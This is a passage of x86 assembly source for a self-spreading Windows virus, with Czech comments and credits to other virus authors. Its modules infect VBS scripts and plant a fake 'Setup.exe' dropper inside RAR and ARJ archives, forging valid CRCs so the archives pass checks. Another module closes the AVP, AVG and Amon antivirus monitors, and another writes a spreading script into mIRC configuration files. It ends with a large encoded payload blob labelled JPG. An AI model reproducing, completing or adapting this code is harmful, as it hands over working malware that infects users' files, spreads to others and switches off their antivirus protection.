                mov     [ebx + 1],al

                cmp     testFF,0FFh
                je      OkiSet1

                cmp     word ptr [ebx + 1],'FF'
                je      OkiSet
                jmp     _hophop

OkiSet:
                mov     testFF,0FFh
                Jmp     _hophop
OkiSet1:
                inc     _cislo_2
                mov     al,_cislo_2
                mov     [ebx],al
                mov     testFF,00000000h

_hophop:
                cmp     here?,0ABCDEFh
                je      __saveloop
                mov     here?,0ABCDEFh

                lea     edi,[FindFileData.cFileName]

                xor     ebx,ebx

                push    ebx                    ;0
                push    00000080h              ;
                push    3                      ;
                push    ebx                    ;0
                push    ebx                    ;0
                push    GENERIC_READ + GENERIC_WRITE
                push    edi                    ;jake jmeno souboru

                call    CreateFileA

                mov     dword ptr [_filehandle],eax

                mov     edx,_VBSsize_

                push    00h
                push    offset number
                push    edx
                push    offset VBSFILEZ
                push    dword ptr [_filehandle]
                call    ReadFile

                sub     edx,edx
                xor     eax,eax
                call    _SetFilePointer

                mov     ebx,VBSHeadersize
                mov     edx,offset HeadVBS
                call    _WriteFile

__saveloop:
                mov     ebx,WriteTextSize
                mov     edx,offset WriteText
                call    _WriteFile

                mov     ebx,DataVBSize
                mov     edx,offset DataFileVBS
                call    _WriteFile

                inc     repeat?
                cmp     repeat?,1620
                je      asddsaasd

                jmp     __repeat__

asddsaasd:
                mov     ebx,VBSEndHead
                mov     edx,offset EndHeadVBS
                call    _WriteFile

                mov     ebx,_VBSsize_
                mov     edx,offset VBSFILEZ
                call    _WriteFile


                push    dword ptr [_filehandle];
                                               ;
                call    CloseHandle            ;
quit_VBS_infect:
                inc     krat_
                cmp     krat_,2
                je      EndVBS_
                push    offset _windir
                call    SetCurrentDirectoryA

                jmp     _searchVBS

                push    offset _ctrdir
                call    SetCurrentDirectoryA

EndVBS_:
                ret



 HexWrite8      proc                            ; This code has been taken
                mov     ah,al                   ; from the 1st generation
                and     al,0Fh                  ; host of Bizatch
                shr     ah,4
                or      ax,3030h
                xchg    al,ah
                cmp     ah,39h
                ja      @@4
 @@1:
                cmp     al,39h
                ja      @@3
 @@2:
                stosw
                ret
 @@3:
                sub     al,30h
                add     al,'A' - 10
                jmp     @@2
 @@4:
                sub     ah,30h
                add     ah,'A' - 10
                jmp     @@1
 HexWrite8      endp

 HexWrite16     proc
                push    ax
                xchg    al,ah
                call    HexWrite8
                pop     ax
                call    HexWrite8
                ret
 HexWrite16     endp

 HexWrite32     proc
                push    eax
                shr     eax, 16
                call    HexWrite16
                pop     eax
                call    HexWrite16
                ret
 HexWrite32     endp

        cislo0:
                mov     _cislo_,30h
                ret
        cislo1:
                mov     _cislo_1,30h
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³Rar infect  flu_archive.inc                                                ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

                HeaderSize      equ FinRARHeader-RARHeader
                Size            equ 7000h
                RARFilez        db '*.RAR',0
                ARJFilez        db '*.ARJ',0

                Wormbajt:

_FindFile:
                push    offset FindFileData
                push    edx

                call    FindFirstFileA

                ret

_CreateFile:
                xor     eax,eax

                push    eax
                push    00000080h
                push    03
                push    eax
                push    eax
                push    0c0000000h
                push    edi

                call    CreateFileA

                ret

_WriteFile:
                push    0
                push    offset number
                push    ebx
                push    edx
                push    dword ptr [_filehandle]
                call    WriteFile

                ret

_SetupAR_Infect:
                mov     edx, offset RARFilez
                call    _FindFile

                inc     eax
                je      ARJsearch
                dec     eax

                lea     edi,[FindFileData.cFileName]

                call    RAR_FILEZ

ARJsearch:
                mov     edx, offset ARJFilez
                call    _FindFile

                inc     eax
                je      quitsetupAR
                dec     eax

                lea     edi,[FindFileData.cFileName]

                call    ARJ_FILEZ

quitsetupAR:

                ret
RAR_FILEZ:
                call    _CreateFile

                mov     dword ptr [_filehandle],eax

                push    02
                push    00
                push    00                             
                push    eax
                call    SetFilePointer

                mov     esi,offset ReadBinaryBuff
                mov     edi,5000h                       
                call    CRC32                           

                mov     dword ptr [RARCrc32],eax        

                mov     esi,offset RARHeader+2
                mov     edi,HeaderSize-2
                call    CRC32                           
                mov     word ptr [RARHeaderCRC],ax

                mov     ebx,HeaderSize
                mov     edx,offset RARHeader
                call    _WriteFile

                mov     word ptr [RARHeaderCRC],0
                mov     word ptr [RARCrc32],0           
                mov     word ptr [RARCrc32+2],0

                mov     ebx,5000h
                mov     edx,offset ReadBinaryBuff
                call    _WriteFile

                push    dword ptr [_filehandle]          
                call    CloseHandle

                ret
ARJ_FILEZ:
                call    _CreateFile
                mov     dword ptr [_filehandle],eax

                push    02
                push    00
                push    00                             
                push    eax
                call    SetFilePointer

                xchg    ecx,edx                        
                mov     edx,eax
                sub     edx,4
                sbb     ecx,1
                add     ecx,1

                push    00                             
                push    00
                push    edx                             
                push    dword ptr [_filehandle]
                call    SetFilePointer

                mov     esi,offset ReadBinaryBuff
                mov     edi,5000h                       
                call    CRC32                           

                mov     dword ptr [ARJCRC32],eax       

                mov     ebx,SecondSide-HeaderARJ
                mov     edx,offset HeaderARJ
                call    _WriteFile

                mov     esi,offset ARJHSmsize
                mov     edi,ARJHeaderCRC-ARJHSmsize
                call    CRC32

                mov     dword ptr [ARJHeaderCRC],eax

                mov     ebx,FinSide-SecondSide
                mov     edx,offset SecondSide
                call    _WriteFile

                mov     dword ptr [ARJHeaderCRC],0
                mov     dword ptr [ARJCRC32],0

                mov     ebx,5000h
                mov     edx,offset ReadBinaryBuff
                call    _WriteFile

                mov     word ptr [ARJHeadsiz],0

                push    0
                push    offset number                   
                push    4
                push    offset HeaderARJ               
                push    dword ptr [_filehandle]
                call    WriteFile


                mov     ebx,4
                mov     edx,offset HeaderARJ
                call    _WriteFile

                push    dword ptr [_filehandle]          
                call    CloseHandle

                ret


CRC32:          cld                            ; Routine extracted from Vecna's
                push   ebx                     ; Inca virus! Muito brigado, friend!
                mov    ecx,-1                  ; Calculates CRC32 at runtime, no
                mov    edx,ecx                 ; need of big tables.
  NextByteCRC:
                xor    eax,eax
                xor    ebx,ebx
                lodsb
                xor    al,cl
                mov    cl,ch
                mov    ch,dl
                mov    dl,dh
                mov    dh,8
  NextBitCRC:
                shr    bx,1
                rcr    ax,1
                jnc    NoCRC
                xor    ax,08320h
                xor    bx,0edb8h
  NoCRC:        dec    dh
                jnz    NextBitCRC
                xor    ecx,eax
                xor    edx,ebx
                dec    di
                jnz    NextByteCRC
                not    edx
                not    ecx
                pop    ebx
                mov    eax,edx
                rol    eax,16
                mov    ax,cx
                ret

RARHeader:                                     
                RARHeaderCRC    dw 0                           
                RARType         db 074h                         
                RARFlags        dw 8000h
                RARHeadsize     dw HeaderSize
                RARCompressed   dd Size                        
                RAROriginal     dd Size                        
                RAROs           db 0                            
                RARCrc32        dd 0                            
                RARFileTime     db 063h,078h                    
                RARFileDate     db 031h,024h                    
                RARNeedVer      db 014h
                RARMethod       db 030h                         
                RARFnameSize    dw FinRARHeader-RARName
                RARAttrib       dd 0
                RARName         db 'SetSetup.exe',0             

                FinRARHeader label byte

HeaderARJ:
                ARJSig          db 60h,0eah                    
                ARJHeadsiz      dw 28h                          
                ARJHSmsize      db 01eh                         
                ARJVer          db 07h                         
                ARJMin          db 01h                         
                ARJHost         db 0h                           
                ARJFlags        db 10h                          
                ARJMethod       db 0h                          
                ARJFiletype     db 0h                          
                ARJReserved     db 'Z'                          
                ARJFileTime     db 063h,078h                    
                ARJFileDate     db 031h,024h                   
                ARJCompress     dd Size                        
                ARJOriginal     dd Size                         
                ARJCRC32        dd 0                            
                ARJEntryName    dw 0
                ARJAttribute    dw 0                            
                ARJHostData     dw 0
SecondSide:
                ARJFilename     db 'Setup.exe',0               
                ARJComment      db 0                           
                ARJHeaderCRC    dd 0                           
                ARJExtended     dw 0
FinSide:

;Thx Benny/29A

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³KillAVmonitor  flu_KillAV.inc                                        ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

_KillAVmonitor:
                mov     eax, offset wAVP
                call    FindWindow

                mov     eax, offset wAVG
                call    FindWindow

                mov     eax, offset wAAM
                call    FindWindow

                ret

FindWindow:
                push    eax
                cdq
                push    edx
                call    FindWindowA

                xchg    eax, ecx
                jecxz   quit

                push    edx
                push    edx
                push    12h
                push    ecx
                call    PostMessageA

quit:

                ret

        wAVP    db      'AVP Monitor',0
        wAVG    db      'AVG Control Center',0
        wAAM    db      'Amon Antivirus Monitor',0

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³Mirc Attack  flu_irc.inc                                                   ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

         _mirc_setup:

                mov     edx,offset _mirc_
                call    _install_script
                mov     edx,offset _mirc32_
                call    _install_script
                mov     edx,offset _mprog_
                call    _install_script
                mov     edx,offset _mprog32_
                call    _install_script

                ret

_install_script:


                xor       ebx,ebx

                push    ebx                    ;0
                push    00000080h              ;
                push    2                      ;
                push    ebx                    ;0
                push    ebx                    ;0
                push    0c0000000h             ;jenom pro zapis
                push    edx        ;jake jmeno souboru
                call    CreateFileA            ;

                inc     eax
                je      end_install_script
                dec     eax

                mov     dword ptr [_filehandle],eax


                push    0                      ;0
                push    offset number          ;
                push    offset _END_DCC - offset __DCC  ;kolik zapat
                push    offset __DCC       ;data pro zapis
                push    dword ptr [_filehandle];
                                              ;
                call    WriteFile

                push    dword ptr [_filehandle];
                call    CloseHandle            ;


end_install_script:
                ret

;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³JPG  flu_jpg.inc                                                           ³
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ


        JPG_START:

        radix 16 ;jojo to jsem ja! :)

        db 44h, 63h, 44h, 5Bh, 0BBh, 0ABh, 0F1h, 0FDh, 0F2h, 0FDh, 0BBh, 0BAh
        db 0BAh, 0BBh, 0BBh, 0BAh, 0BBh, 0BAh, 0BBh, 0BBh, 44h, 60h, 0BBh, 0F8h
        db 0BBh, 0EBh, 8Ch, 87h, 0FDh, 87h, 89h, 0EBh, 0FDh, 0FAh, 0FDh, 0E1h
        db 0EEh, 0EBh, 0E4h, 0C3h, 73h, 39h, 0C3h, 0D5h, 0D5h, 0C3h, 4Eh, 14h
        db 02, 2A, 73, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44
        db 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44
        db 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 60, 0BBh, 0F8h, 0BAh, 0EEh
        db 0E1h, 0E1h, 0C3h, 0D2h, 0C3h, 50, 39, 39, 50, 44, 44, 44, 44, 44
        db 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44
        db 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44
        db 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 44, 7Bh
        db 0BBh, 0AAh, 0B3h, 0BBh, 23h, 0BBh, 19h, 0B8h, 0BAh, 99h, 0BBh, 0B9h
        db 0AAh, 0BAh, 0B8h, 0AAh, 0BAh, 44h, 7Fh, 0BBh, 0A4h, 0BBh, 0BBh, 0BAh
        db 0BEh, 0BAh, 0BAh, 0BAh, 0BAh, 0BAh, 0BAh, 0BBh, 0BBh, 0BBh, 0BBh
        db 0BBh, 0BBh, 0BBh, 0BBh, 0BAh, 0B9h, 0B8h, 0BFh, 0BEh, 0BDh, 0BCh
        db 0B3h, 0B2h, 0B1h, 0B0h, 44h, 7Fh, 0BBh, 0Eh, 0ABh, 0BBh, 0B9h, 0BAh
        db 0B8h, 0B8h, 0B9h, 0BFh, 0B8h, 0BEh, 0BEh, 0BFh, 0BFh, 0BBh, 0BBh
        db 0BAh, 0C6h, 0BAh, 0B9h, 0B8h, 0BBh, 0BFh, 0AAh, 0BEh, 0A9h, 9Ah
        db 8Ah, 0FAh, 0BDh, 0A8h, 0EAh, 0DAh, 0BCh, 99h, 0CAh, 0AFh, 89h, 3Ah
        db 2Ah, 1Ah, 0B3h, 98h, 0F9h, 0Ah, 7Ah, 0AEh, 0E9h, 6Ah, 4Bh, 9Fh, 88
        db 0D9h, 0C9h, 39, 0B2h, 0B1h, 0ADh, 0ACh, 0A3h, 0A2h, 0A1h, 9E, 9D
        db 9C, 93, 92, 91, 8F, 8E, 8D, 8C, 83, 82, 81, 0F8h, 0FFh, 0FEh, 0FDh
        db 0FCh, 0F3h, 0F2h, 0F1h, 0E8h, 0EFh, 0EEh, 0EDh, 0ECh, 0E3h, 0E2h
        db 0E1h, 0D8h, 0DFh, 0DEh, 0DDh, 0DCh, 0D3h, 0D2h, 0D1h, 0C8h, 0CFh
        db 0CEh, 0CDh, 0CCh, 0C3h, 0C2h, 0C1h, 38, 3Fh, 3Eh, 3Dh, 3C, 33, 32
        db 31, 29, 28, 2F, 2E, 2D, 2C, 23, 22, 21, 19, 18, 1Fh, 1Eh, 1Dh, 1Ch
        db 13, 12, 11, 09, 08, 0F, 0E, 0D, 0Ch, 03, 02, 01, 79, 78, 7Fh, 7Eh
        db 7Dh, 7Ch, 73, 72, 71, 69, 68, 6Fh, 6Eh, 6Dh, 6C, 63, 62, 61, 5A, 59
        db 58, 5F, 5E, 5D, 5C, 53, 52, 51, 4A, 49, 48, 4F, 4E, 4D, 4C, 43, 42
        db 41, 44, 7F, 0BBh, 0A4h, 0BAh, 0BBh, 0B8h, 0BAh, 0BAh, 0BAh, 0BAh
        db 0BAh, 0BAh, 0BAh, 0BAh, 0BAh, 0BBh, 0BBh, 0BBh, 0BBh, 0BBh, 0BBh
        db 0BAh, 0B9h, 0B8h, 0BFh, 0BEh, 0BDh, 0BCh, 0B3h, 0B2h, 0B1h, 0B0h
        db 44, 7Fh, 0BBh, 0Eh, 0AAh, 0BBh, 0B9h, 0BAh, 0B9h, 0BFh, 0BFh, 0B8h
        db 0BFh, 0BCh, 0BEh, 0BFh, 0BFh, 0BBh, 0BAh, 0B9h, 0CCh, 0BBh, 0BAh
        db 0B9h, 0B8h, 0AAh, 0BFh, 0BEh, 9A, 8A, 0BDh, 0A9h, 0FAh, 0EAh, 0BCh
        db 0DAh, 0CAh, 0A8h, 99, 89, 3Ah, 0B3h, 0AFh, 0F9h, 2Ah, 1Ah, 0Ah, 7Ah
        db 0B2h, 98, 88, 0E9h, 4Bh, 0AEh, 0D9h, 0C9h, 6Ah, 0B1h, 0ADh, 9Fh, 8Fh
        db 5Ah, 9Eh, 4Ah, 0ACh, 0A3h, 0A2h, 0A1h, 9Dh, 9Ch, 93, 92, 91, 8Eh
        db 8Dh, 8Ch, 83, 82, 81, 0F8h, 0FFh, 0FEh, 0FDh, 0FCh, 0F3h, 0F2h, 0F1h
        db 0E8h, 0EFh, 0EEh, 0EDh, 0ECh, 0E3h, 0E2h, 0E1h, 0D8h, 0DFh, 0DEh
        db 0DDh, 0DCh, 0D3h, 0D2h, 0D1h, 0C8h, 0CFh, 0CEh, 0CDh, 0CCh, 0C3h
        db 0C2h, 0C1h, 39, 38, 3Fh, 3Eh, 3Dh, 3Ch, 33, 32, 31, 29, 28, 2Fh, 2Eh
        db 2Dh, 2Ch, 23, 22, 21, 19, 18, 1Fh, 1Eh, 1Dh, 1Ch, 13, 12, 11, 09, 08
        db 0Fh, 0Eh, 0Dh, 0Ch, 03, 02, 01, 79, 78, 7Fh, 7Eh, 7Dh, 7Ch, 73, 72
        db 71, 69, 68, 6Fh, 6E, 6Dh, 6Ch, 63, 62, 61, 59, 58, 5Fh, 5Eh, 5Dh
        db 5Ch, 53, 52, 51, 49, 48, 4Fh, 4Eh, 4Dh, 4Ch, 43, 42, 41, 44, 61
        db 0BBh, 0B7h, 0B8h, 0BAh, 0BBh, 0B9h, 0AAh, 0B8h, 0AAh, 0BBh, 084h
        db 0BBh, 00, 0FEh, 0AFh, 0EBh, 0BAh, 0FEh, 0AFh, 20, 3D, 0CAh, 21, 0BBh
        db 0E1h, 92, 8C, 0B4h, 0EAh, 42, 69, 0D4h, 0F4h, 54, 94, 5Ch, 0FBh
        db 0B5h, 19, 2Bh, 0ABh, 0C1h, 0A1h, 0E1h, 0BBh, 93, 19, 31, 0BBh, 93
        db 19, 31, 0BBh, 93, 19, 31, 0BBh, 93, 19, 31, 0BBh, 93, 19, 31, 0BBh
        db 93, 19, 31, 0BBh, 93, 19, 31, 0BBh, 93, 19, 31, 0BBh, 0DFh, 24, 0CCh
        db 4Ah, 13, 0E3h, 5Ch, 87, 0C8h, 4Fh, 12, 0DDh, 40, 24, 33, 11, 57
        db 0C9h, 82, 52, 4Eh, 1Bh, 0BAh, 32, 56, 6Ch, 85, 2Eh, 0AAh, 9Ch, 04, 49
        db 1Ch, 0A8h, 51, 0FCh, 0A5h, 4Fh, 78, 42, 0C6h, 93, 0BAh, 0A2h, 46, 52
        db 00, 06, 0D3h, 8Fh, 2Fh, 0BBh, 00, 34, 15, 92, 0C7h, 62, 0BAh, 5Ah, 60
        db 24, 0C1h, 0DEh, 93, 5Ch, 83, 83, 54, 0FBh, 0A9h, 0B2h, 0DEh ,45, 42
        db 47, 0D2h, 7Dh, 59, 0CAh, 47, 0C4h, 1Eh, 8Fh, 0B8h, 3Dh, 4Ch, 4Eh, 18
        db 0BFh, 0ABh, 0F3h, 59, 3Bh, 0A6h, 4Dh, 22, 0Ah, 26, 64, 1Eh, 93, 00
        db 2Fh, 0CEh, 98, 49, 13, 03, 75, 92, 8Dh, 39, 0B2h, 86, 93, 0B9h, 0C4h
        db 0Dh, 0F2h, 46, 6Eh, 47, 04, 41, 4Fh, 54, 0Dh, 84, 4Ch, 0FEh, 0EFh, 98
        db 37, 31, 88, 0FBh, 0ACh, 0FEh, 64, 11, 0C5h, 0Eh, 99, 67, 12, 57, 64
        db 2Eh, 0EBh, 0BCh, 47, 5Dh, 27, 0B4h, 82, 76, 0BBh, 0E4h, 0A9h, 12, 4Eh
        db 47, 12, 5Ah, 38, 0CFh, 11, 0F1h, 66, 08, 24, 0F1h, 08, 0B4h, 0C5h
        db 0C8h, 43, 6Bh, 0BFh, 0Fh, 0EAh, 0FEh, 0BBh, 0AFh, 0EAh, 0FEh, 0BBh
        db 0FEh, 82, 42, 0FCh, 6Dh, 10, 25, 0C4h, 79, 17, 0F4h, 61, 10, 8Ah, 50
        db 6Ch, 48, 1Bh, 0BDh, 0Ch, 6Dh, 18, 84, 3Eh, 87, 27, 0A4h, 45, 06, 0FDh
        db 0F5h, 0F6h, 0BBh, 9Dh, 0D3h, 0A7h, 25, 0C8h, 31, 92, 0C1h, 0A7h, 35
        db 0C6h, 13, 0BAh, 0C1h, 0DFh, 0A5h, 0C6h, 92, 0BDh, 0C0h, 68, 3Bh, 42
        db 0C3h, 54, 0F1h, 0AFh, 25, 66, 93, 0BAh, 0F8h, 0A9h, 0FCh, 0F1h
        db 0E6h, 7Fh, 0BAh, 64, 85, 39, 24, 08, 0B0h, 74, 0AFh, 31, 0B3h, 7Bh
        db 0A3h, 47, 53, 0BAh, 20, 3Dh, 0C2h, 0E8h, 43, 0EBh, 0BCh, 0F9h, 0B4h
        db 0A4h, 0F1h, 2Ch, 0D1h, 49, 88, 41, 68, 0A2h, 0F9h, 8Bh, 90, 47, 53
        db 0B9h, 89, 1Fh, 25, 0C1h, 4Dh, 7Ch, 0F1h, 0D8h, 92, 0A4h, 0E4h, 0F1h
        db 09, 0BCh, 23, 3Bh, 25, 88, 0EBh, 01, 2Eh, 58, 0BBh, 28, 64, 8Fh, 0BAh
        db 0A6h, 82, 0C6h, 0D3h, 7Dh, 86, 84, 81, 0BCh, 0AFh, 0BAh, 93, 9Ch, 1Eh
        db 0E1h, 0Ch, 53, 64, 0E1h, 1Dh, 0B5h, 0BEh, 0E0h, 0Dh, 82, 0B6h, 43
        db 0EBh, 0BFh, 4Fh, 0EAh, 0FEh, 0BBh, 0AFh, 0EAh, 0FEh, 0BBh, 0FAh, 82
        db 5Fh, 0EEh, 0CDh, 82, 54, 34, 48, 7Ch, 0D1h, 21, 5Fh, 0C7h, 78, 14
        db 0FAh, 0EBh, 2Ah, 35, 46, 13, 0BAh, 1Fh, 4Eh, 0A6h, 0C2h, 7Eh, 8Bh
        db 0D8h, 60, 8Fh, 01Ch, 9Ch, 6Ch, 0AFh, 5Fh, 0B8h, 9Ch, 0C3h, 86, 93
        db 0BAh, 11, 25, 3Ch, 86, 0Ah, 0F5h, 0DBh, 0B0h, 0DCh, 98, 0A5h
        db 0Eh, 99, 0FDh, 0F3h, 72, 40, 66, 88, 0F4h, 60, 60, 27, 5Ch, 06
        db 0BBh, 8Ah, 0B3h, 7Bh, 73, 5Dh, 1Eh, 61h, 03, 58, 0A6h, 82, 13, 0F1h
        db 27, 4Fh, 47, 92, 0B2h, 0DEh, 74, 0E8h, 21, 0BBh, 23, 56, 0BFh, 0CFh
        db 41, 0B1h, 2Ah, 0E8h, 9Ch, 0CCh, 0A3h, 99, 1Ah, 0B7h, 0F3h, 73, 0BFh
        db 0C6h, 91, 0E3h, 5Fh, 0BEh, 0BCh, 16, 0BBh, 87, 19, 25, 1Bh, 0D8h
        db 69, 18, 0CEh, 0BFh, 4Bh, 81, 0C0h, 69, 54, 0BCh, 06Ch, 52, 0F5h, 42
        db 23, 5Bh, 0A9h, 1Ch, 52, 21, 0BBh, 17, 7Bh, 37, 0D8h, 83, 0A5h, 4Fh
        db 1Eh, 0CCh, 7Dh, 0F3h, 9Bh, 0D8h, 86, 0F4h, 0F1h, 29, 0FBh, 0ECh, 26
        db 64, 32, 13, 19, 96, 2Dh, 9Bh, 0A5h, 0D3h, 0B9h, 0ACh, 0E7h, 8Dh, 0BCh
        db 0D4h, 0F1h, 0D3h, 50, 6Dh, 1Dh, 28, 98, 87, 0D8h, 04, 0E5h, 0F6h
        db 0F9h, 83, 1Bh, 0BCh, 0B7h, 41, 6Eh, 70, 0E4h, 4Eh, 0DFh, 40, 6Eh, 8Ah
        db 68, 84, 26, 0E6h, 0Eh, 44, 0BBh, 0EDh, 0C1h, 4Eh, 54, 4Fh, 0AFh, 0BAh
        db 8Eh, 0AFh, 0EAh, 0FBh, 0BEh, 0AFh, 0EAh, 0FBh, 0AEh, 55, 0B4h, 76
        db 68, 86, 91, 00, 0D8h, 0A3h, 99, 1Ch, 20, 0A5h, 0DAh, 74, 0Eh, 0FBh
        db 0FCh, 52, 6Ch, 31, 0BBh, 88, 2Dh, 7Ch, 06, 82, 0AFh, 28, 7Bh, 58, 16
        db 8Bh, 0AAh, 25, 26, 43, 59, 17, 7Eh, 4Ch, 0FAh, 9Bh, 4Fh, 4Fh, 1Bh
        db 0B2h, 0EEh, 0BDh, 65, 23, 8Fh, 62, 0ABh, 0A5h, 0ECh, 13, 4Fh, 1Ch
        db 0A9h, 0CAh, 2Eh, 52, 0F6h, 9Fh, 0DFh, 58, 12, 5Ch, 0AFh, 0BAh, 0A4h
        db 0A3h, 0A7h, 0B7h, 46, 91, 0A2h, 0A0h, 0BBh, 37, 45, 2E, 9Fh, 22, 9Fh
        db 0B7h, 0B5h, 0FEh, 0FAh, 9Ch, 0B8h, 0A3h, 84, 2Eh, 0BBh, 0BAh, 75, 0CDh
        db 4Eh, 5Ch, 69, 1Dh, 0E5h, 22, 75, 84, 0B1h, 3Ah, 0BCh, 0D7h, 0CEh, 47
        db 11, 79, 13, 0EEh, 5Bh, 0C1h, 0DCh, 31, 0BBh, 0C1h, 57, 75, 69, 84, 81
        db 2Ah, 0EFh, 0D6h, 98, 6Ch, 28, 0F7h, 32, 0FDh, 0F5h, 0ECh, 6Ch, 16,0F1h
        db 0BBh, 57, 93, 0BAh, 34, 0ABh, 0DBh, 0F5h, 0CAh, 0EBh, 7Dh, 3Fh, 0F2h
        db 49, 4Ch, 74, 83, 12, 62, 0BBh, 0F7h, 0B5h, 85, 2Eh, 0AFh, 0C4h, 50
        db 0Ah, 03, 25, 0B6h, 0BBh, 0FCh, 81, 0B6h, 43, 4Fh, 56, 0EBh, 2Eh, 7Ch
        db 0CBh, 0FEh, 0E3h, 26, 0F2h, 28, 35, 0D1h, 14, 06Bh, 0C8h, 47, 13, 0BAh
        db 65, 58, 69, 15, 0E1h, 0C4h, 11, 84, 0E1h, 1Dh, 0B4h, 0A6h, 00, 4Eh
        db 0AEh, 0C1h, 64, 0A5h, 0F3h, 98, 06, 0BBh, 0F0h, 0FEh, 0AFh, 0EBh, 0BAh
        db 0FEh, 0AFh, 0EBh, 0BEh, 0D2h, 0CAh, 5Dh, 0A9h, 0C6h, 11, 0BCh, 84, 16
        db 0E3h, 2Ch, 2Ch, 9Ch, 48, 13, 0A0h, 13, 72, 58, 25, 0C8h, 0FBh, 0B0h
        db 0A9h, 29, 0C9h, 0C1h, 0B8h, 52, 0EDh, 0EBh, 0CAh, 68, 34, 0F1h, 39, 99
        db 0ACh, 27, 48, 25, 5Dh, 16, 0B5h, 39, 3Bh, 0B7h, 0D6h, 0A7h, 0B7h, 0B1h
        db 36, 3Bh, 0D5h, 0ECh, 1Dh, 0C1h, 0EFh, 22, 0B0h, 27, 0EFh, 0A9h, 0A6h
        db 7Ch, 98, 15, 0D3h, 0BAh, 35, 0EFh, 4Bh, 0C9h, 0B3h, 0AEh, 0E6h, 63, 28
        db 50, 0F4h, 0DCh, 0BFh, 0A7h, 35, 0C0h, 6Fh, 0E2h, 58, 21, 0BBh, 0C7h
        db 0FCh, 5Dh, 50, 6Bh, 4Fh, 10, 0FBh, 0BBh, 81, 29, 0C6h, 91, 17, 0DCh
        db 0B7h, 88, 37, 0EEh, 2Fh, 0CAh, 2Ah, 63, 0AAh, 50, 0FBh, 0A8h, 1Bh, 98
        db 14, 06, 80, 37, 46, 0D2h, 31, 77, 0EFh, 0A9h, 0BCh, 0F7h, 68, 7Ah, 4Eh
        db 5Bh, 6Bh, 0BFh, 0C9h, 1Bh, 0DBh, 0F4h, 82, 85, 3Dh, 1Ah, 3Fh, 0C5h
        db 4Fh, 28, 7Bh, 0EBh, 0C1h, 6Eh, 3Dh, 98, 1Dh, 0FDh, 0C6h, 51, 01, 11
        db 5Fh, 5Bh, 0C1h, 4Ch, 1Bh, 0BDh, 0F7h, 1Fh, 05, 0CCh, 0ABh, 84, 24, 0AEh
        db 0B2h, 0BFh, 0CEh, 8Eh, 8Fh, 75, 3Ch, 12, 84, 94, 0F7h, 0EFh, 0E2h,0A7h
        db 0DBh, 45, 0Fh, 0BBh, 18, 03, 45, 2Eh, 0C5h, 9Ah, 33, 6Fh, 0C0h, 0EEh
        db 0AAh, 7Ch, 0C7h, 0EEh, 43, 44, 0BBh, 6Eh, 14, 6Bh, 0EBh, 0B8h, 13, 19
        db 31, 0BBh, 93, 19, 31, 0BBh, 14, 93, 42, 01, 6Fh, 97, 82, 50, 50, 0E8h
        db 82, 0A2h, 45, 0EEh, 0A0h, 8Ch, 9Ch, 1Bh, 50, 0FBh, 0B6h, 5Eh, 0CBh
        db 0D1h, 0E3h, 1Eh, 9Bh, 0DCh, 0A7h, 0C1h, 0EFh, 0FEh, 0C9h, 64, 34, 5Eh
        db 0F2h, 2Bh, 0BCh, 0A5h, 6Fh, 0BAh, 0DAh, 5Fh, 80, 0F2h, 0BFh, 48
        db 6Bh, 0D9h, 1Ah, 0DDh, 73, 9Eh, 0F2h, 7Eh, 92, 0DBh, 0EFh, 37, 3Bh, 85
        db 0Eh, 0E7h, 01, 11, 5Fh, 5Bh, 0C1h, 4Ch, 01Bh, 0BDh, 0F7h, 1Fh, 05
        db 0CCh, 0ABh, 84, 24, 0AEh, 0B2h, 0BFh, 0CEh, 08Eh, 08Fh, 75, 3Ch, 12
